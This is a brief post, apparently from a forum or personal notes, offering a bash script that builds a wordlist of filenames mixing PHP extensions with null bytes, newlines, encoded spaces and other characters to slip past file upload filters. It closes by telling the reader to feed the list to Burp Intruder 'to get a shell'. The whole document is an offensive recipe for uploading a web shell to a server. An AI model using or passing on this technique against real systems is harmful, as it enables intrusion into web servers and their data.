here is a simple script that i used while trying to bypass and upload filter.


```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' 'â€¦' ':'; do
        for ext in '.php' '.phps' '.phar'; do
           echo "shell$char$ext.jpg" >> wordlist.txt
           echo "shell$ext$char.jpg" >> wordlist.txt
           echo "shell.jpg$char$ext" >> wordlist.txt
           echo "shell.jpg$ext$char" >> wordlist.txt
       done
done
```

Use Burp and throw this into intruder to get a shell.
